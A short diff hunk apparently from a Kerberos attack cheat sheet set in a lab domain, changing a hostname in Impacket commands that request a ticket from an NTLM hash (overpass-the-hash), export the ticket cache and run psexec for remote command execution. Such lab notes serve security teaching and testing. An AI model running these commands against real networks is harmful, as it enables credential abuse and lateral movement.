@@ -104,7 +104,7 @@ python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2
 
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 
-psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
+psexec.py jurassic.park/velociraptor@ws02.jurassic.park -k -no-pass
 ```
 
 >Generates kerberos tickets
